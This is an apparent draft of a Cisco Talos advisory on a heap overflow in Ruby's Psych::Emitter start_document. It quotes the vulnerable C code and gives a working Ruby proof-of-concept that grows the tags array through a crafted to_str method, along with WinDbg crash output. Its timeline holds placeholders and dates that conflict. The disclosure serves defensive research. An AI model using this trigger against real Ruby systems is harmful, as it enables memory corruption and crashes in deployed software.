Cisco Talos Vulnerability Report
TALOS-CAN-XXX

Ruby Psych::Emitter start_document function Heap Overflow vulernability.

:: Description
	An exploitable heap overflow vulnerability exists in the Psych::Emitter start_document function functionality of Ruby. 
 In Psych::Emitter start_document function heap buffer "head" allocation is made based on tags array length. Specially constructed object passed as element
 of tags array can increase this array size after mentioned allocation and cause heap overflow.
 
 
:: Tested Versions

Ruby 2.3.0 dev
Ruby 2.2.2

:: Product URLs

https://www.ruby-lang.org


:: Details

Line 138 	static VALUE start_document(VALUE self, VALUE version, VALUE tags, VALUE imp)
Line 139 	{
			(...)

Line 160		#ifdef HAVE_RUBY_ENCODING_H
Line 161				rb_encoding * encoding = rb_utf8_encoding();
Line 162		#endif
Line 163	
Line 164				Check_Type(tags, T_ARRAY);
Line 165	
Line 166				head  = xcalloc((size_t)RARRAY_LEN(tags), sizeof(yaml_tag_directive_t));
Line 167				tail  = head;
Line 168	
Line 169				for(i = 0; i < RARRAY_LEN(tags); i++) {
Line 170					VALUE tuple = RARRAY_PTR(tags)[i];
Line 171					VALUE name;
Line 172					VALUE value;
Line 173	
Line 174					Check_Type(tuple, T_ARRAY);
Line 175	
Line 176					if(RARRAY_LEN(tuple) < 2) {
Line 177						xfree(head);
Line 178						rb_raise(rb_eRuntimeError, "tag tuple must be of length 2");
Line 179					}
Line 180					name  = RARRAY_PTR(tuple)[0];
Line 181					value = RARRAY_PTR(tuple)[1];
Line 182		#ifdef HAVE_RUBY_ENCODING_H
Line 183					name = rb_str_export_to_enc(name, encoding);
Line 184					value = rb_str_export_to_enc(value, encoding);
Line 185		#endif
Line 186	
Line 187					tail->handle = (yaml_char_t *)StringValuePtr(name);
Line 188					tail->prefix = (yaml_char_t *)StringValuePtr(value);
Line 189	
Line 190					tail++;
Line 191				}
Line 192			}


In Line 166 based on length of passed by user tags array, xcalloc allocates buffer for yaml_tag_directive_t structures. 
Later in for loop each element of tags array is checked whether is in form of tuple, which here means [name,value].
name and value of this tuple is "converted" in two different way:

1. Line 180,181
If encoding of name or value is different than utf-8 function rb_str_export_to_enc returns NEW (very important) string object with proper encoding.
[#2] Function does not check whether passed object is a String or not, as You can see there is no before check either. 
Passing e.g Integer value as name in tuple will case read access violation in search_nonascii function. For more details see #2 point in 
Crash analysis section.
2. Line 187,188
StringValuePtr function returns pointer to string or if passed object as argument is not a string, tries to convert it to string.
Conversion is made via call to rb_str_to_str so in consequences object vtable is checked for "to_str" method.
	Exploiting knowledge that StringValuePtr for non String object will call "to_str" method we can create properly constructed object which will 
implement this method and pass this object as a name or value for a tuple. During the execution of this method size of tags array declared as global variable 
will be increase. That operation later in Line 187,188 will cause heap overflow.
	To achieve this result we need to satisfy two constraints.
Object passed as value or name in tuple needs to be/has:
a) encoding field set to utf-8, in other way rb_str_export_to_enc function will return new object, so we will lose controle over it
b) not a String object and has implemented "to_str" method

Solving a)
As we dive deep into rb_str_export_to_enc function we encounter rb_enc_get_index function defined in encoding.c file.
Line 744	int
Line 745	rb_enc_get_index(VALUE obj)
			{
				(...)
Line 754	switch (BUILTIN_TYPE(obj)) {
Line 755	as_default:
Line 756		default:
Line 757		case T_STRING:
Line 758		case T_REGEXP:
Line 759			i = ENCODING_GET_INLINED(obj);
Line 760			if (i == ENCODING_INLINE_MAX) {
Line 761				VALUE iv;
Line 762
Line 763				iv = rb_ivar_get(obj, rb_id_encoding());
Line 764				i = NUM2INT(iv);
Line 765			}
Line 766			break;
Line 767		case T_FILE:
Line 768			tmp = rb_funcallv(obj, rb_intern("internal_encoding"), 0, 0);
Line 769			if (NIL_P(tmp)) obj = rb_funcallv(obj, rb_intern("external_encoding"), 0, 0);
Line 770			else obj = tmp;
Line 771			if (NIL_P(obj)) break;
Line 772		case T_DATA:
Line 773			if (is_data_encoding(obj)) {
Line 774				i = enc_check_encoding(obj);
Line 775			}

There is at least 3 object having encoding fields which we can use. I decided to use Regexp object in my PoC.
b) To created with proper encoding Regex object we need to add to_str method
	
	To see ready solution triggering this vulnerability take a glance on below PoC.

:: PoC

require 'Psych'

$tags = []

puts "[+] Start"
f = File.new("newfile",  "w+")
emitter = Psych::Emitter.new(f)
version = [1,1]
obj = Regexp.new("a".force_encoding("utf-8"),Regexp::Regexp::FIXEDENCODING)

def obj.to_str
	puts "[+] Increasing size of tags array"
	(1..10).map{|x| $tags.push(["AAAA","BBBB"])}
	puts "[+] tags array size : #{$tags.length}"	
	return "x"
end

$tags.push([obj,"tag:TALOS"])
puts "[+] tags array size : #{$tags.length}"	
emitter.start_document(version,$tags,0)

puts "[+] End"

:: Crash analysis

[+] Start
[+] tags array size : 1

		(...)
		head  = xcalloc((size_t)RARRAY_LEN(tags), sizeof(yaml_tag_directive_t));
EIP>	tail  = head;
0:000> dv
         encoding = 0x009244c0
                i = 0n0
             self = 0x93a79c
          version = 0x93a788
             tags = 0x93a850
              imp = 1
             head = 0x02e68d30
            event = struct yaml_event_s
             tail = 0x02e68d30
version_directive = struct yaml_version_directive_s
          emitter = 0x02e5c198
0:000> !heap -p -a 0x02e68d30
    address 02e68d30 found in
    _HEAP @ 900000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        02e68d28 0004 0000  [00]   02e68d30    00008 - (busy)

 
0:000> !heap -x 0x02e68d30
Entry     User      Heap      Segment       Size  PrevSize  Unused    Flags
-----------------------------------------------------------------------------
02e68d28  02e68d30  00900000  02e10000        20        48        18  busy extra fill 

0:000> !heap -p -a 02e68d28+20
    address 02e68d48 found in
    _HEAP @ 900000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        02e68d48 0453 0000  [00]   02e68d50    02290 - (free)

 
0:000> dd 02e68d48 
02e68d48  10d3affe 000609fd 009000c4 00907b28
02e68d58  feeefeee feeefeee feeefeee feeefeee
02e68d68  feeefeee feeefeee feeefeee feeefeee
02e68d78  feeefeee feeefeee feeefeee feeefeee
02e68d88  feeefeee feeefeee feeefeee feeefeee
02e68d98  feeefeee feeefeee feeefeee feeefeee
02e68da8  feeefeee feeefeee feeefeee feeefeee
02e68db8  feeefeee feeefeee feeefeee feeefeee

0:000> g
[+] Increasing size of tags array
[+] tags array size : 11

After couple iteration when "i" is equal:
0:000> dv i
				i = 0n4
0:000> !heap -p -a 02e68d28+20
    address 02e68d48 found in
    _HEAP @ 900000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        02e68d48 0ecd 0000  [00]   02e68d50    07660 - (free)
0:000> !heap -x 02e68d28+20
ERROR: Block 02e68d48 previous size acb5 does not match previous block size 4
HEAP 00900000 (Seg 02e10000) At 02e68d48 Error: invalid block Previous		
0:000> dd 02e68d48 
02e68d48  0093a560 0093a54c 0093a524 0093a4fc
02e68d58  0093a56c 0093a530 0093a4e0 0093a4a4
02e68d68  0093a440 0093a404 0093a3c8 0093a38c
02e68d78  0093a328 baadf00d baadf00d baadf00d
02e68d88  baadf00d baadf00d baadf00d baadf00d
02e68d98  baadf00d baadf00d abababab abababab
02e68da8  00000000 00000000 49d0aba0 180609f4
02e68db8  0093a850 0093a850 0093a850 0093a850  



#2 Read access violation

Change PoC line:
	$tags.push([obj,"tag:TALOS"])
to
	$tags.push([0x112233445566778899,"tag:TALOS"])

	
(b70.16b0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=22334455 ebx=00000000 ecx=22334455 edx=22334458 esi=00000001 edi=00000000
eip=6386ae83 esp=0048f154 ebp=0048f160 iopl=0         nv up ei ng nz ac po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010293
msvcr120_ruby230!search_nonascii+0x33:
6386ae83 0fb611          movzx   edx,byte ptr [ecx]         ds:002b:22334455=??
0:000> kb
ChildEBP RetAddr  Args to Child              
0048f160 6386af3c 22334455 88aaccee 77b75a90 msvcr120_ruby230!search_nonascii+0x33 [t:\projects\bugs\ruby_debug_x32\string.c @ 357]
0048f180 63869e47 22334455 66778899 00174460 msvcr120_ruby230!coderange_scan+0x2c [t:\projects\bugs\ruby_debug_x32\string.c @ 387]
0048f1b4 638699d2 02b3c020 00150000 00000000 msvcr120_ruby230!rb_enc_str_coderange+0x117 [t:\projects\bugs\ruby_debug_x32\string.c @ 516]
0048f224 63869968 02b3c020 00174460 001744c0 msvcr120_ruby230!rb_str_conv_enc_opts+0x62 [t:\projects\bugs\ruby_debug_x32\string.c @ 769]
0048f240 6386993d 02b3c020 00174460 001744c0 msvcr120_ruby230!rb_str_conv_enc+0x18 [t:\projects\bugs\ruby_debug_x32\string.c @ 828]
0048f254 62751a0d 02b3c020 001744c0 00000001 msvcr120_ruby230!rb_str_export_to_enc+0x1d [t:\projects\bugs\ruby_debug_x32\string.c @ 903]
0048f2f8 638a05b6 0018a72c 0018a718 0018a7e0 psych!start_document+0x30d [t:\projects\bugs\ruby_debug_x32\ext\psych\psych_emitter.c @ 183]
0048f310 638a1042 62751700 0018a72c 00000003 msvcr120_ruby230!call_cfunc_3+0x36 [t:\projects\bugs\ruby_debug_x32\vm_insnhelper.c @ 1269]
0048f3d8 638a12bc 00150c70 0057ffd0 02b52f80 msvcr120_ruby230!vm_call_cfunc_with_frame+0x2b2 [t:\projects\bugs\ruby_debug_x32\vm_insnhelper.c @ 1418]
0048f3ec 638a1592 00150c70 0057ffd0 02b52f80 msvcr120_ruby230!vm_call_cfunc+0x4c [t:\projects\bugs\ruby_debug_x32\vm_insnhelper.c @ 1513]
0048f490 6389dc94 00150c70 0057ffd0 02b52f80 msvcr120_ruby230!vm_call_method+0xa2 [t:\projects\bugs\ruby_debug_x32\vm_insnhelper.c @ 1729]
0048f4a4 638a53dc 00150c70 0057ffd0 02b52f80 msvcr120_ruby230!vm_call_general+0x14 [t:\projects\bugs\ruby_debug_x32\vm_insnhelper.c @ 1888]
0048fcc4 638ab7a8 00150c70 00000000 02b493f8 msvcr120_ruby230!vm_exec_core+0x286c [t:\projects\bugs\ruby_debug_x32\insns.def @ 1075]
0048fdb8 6389aeb7 00150c70 63848553 00150dbc msvcr120_ruby230!vm_exec+0x98 [t:\projects\bugs\ruby_debug_x32\vm.c @ 1455]
0048fdd0 6384857e 02b4fcec 3b2f0152 00000000 msvcr120_ruby230!rb_iseq_eval_main+0x27 [t:\projects\bugs\ruby_debug_x32\vm.c @ 1701]
0048fe74 63847378 02b4fcec 0048fe90 63846b50 msvcr120_ruby230!ruby_exec_internal+0x10e [t:\projects\bugs\ruby_debug_x32\eval.c @ 260]
0048fe80 63846b50 02b4fcec 3b67ff26 0048fea0 msvcr120_ruby230!ruby_exec_node+0x18 [t:\projects\bugs\ruby_debug_x32\eval.c @ 322]
*** WARNING: Unable to verify checksum for ruby.exe
0048fe90 00e1103b 02b4fcec 00175590 0048fee0 msvcr120_ruby230!ruby_run_node+0x30 [t:\projects\bugs\ruby_debug_x32\eval.c @ 314]
0048fea0 00e11261 00000002 00174e80 00175590 ruby!main+0x3b [t:\projects\bugs\ruby_debug_x32\main.c @ 36]
0048fee0 75ab337a 7efde000 0048ff2c 77af92e2 ruby!__tmainCRTStartup+0xfd [f:\dd\vctools\crt\crtw32\dllstuff\crtexe.c @ 626]
0048feec 77af92e2 7efde000 64014142 00000000 kernel32!BaseThreadInitThunk+0xe
0048ff2c 77af92b5 00e112c9 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
0048ff44 00000000 00e112c9 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b

Vulnerable code:
static inline const char *
search_nonascii(const char *p, const char *e)
{
#if SIZEOF_VOIDP == 8
# define NONASCII_MASK 0x8080808080808080ULL
#elif SIZEOF_VOIDP == 4
# define NONASCII_MASK 0x80808080UL
#endif
#ifdef NONASCII_MASK
    if ((int)SIZEOF_VOIDP * 2 < e - p) {
        const uintptr_t *s, *t;
        const uintptr_t lowbits = SIZEOF_VOIDP - 1;
        s = (const uintptr_t*)(~lowbits & ((uintptr_t)p + lowbits));
        while (p < (const char *)s) {
>            if (!ISASCII(*p))
                return p;
            p++;
        }
		

:: Credit 

Discovered by Marcin ‘Icewall’ Noga of Sourcefire VRT

:: Timeline

2015-06-08 - Initial Discovery 
2014-XX-XX - Vendor Notification
2014-XX-XX - Patch Released
2014-XX-XX - Public Disclosure		  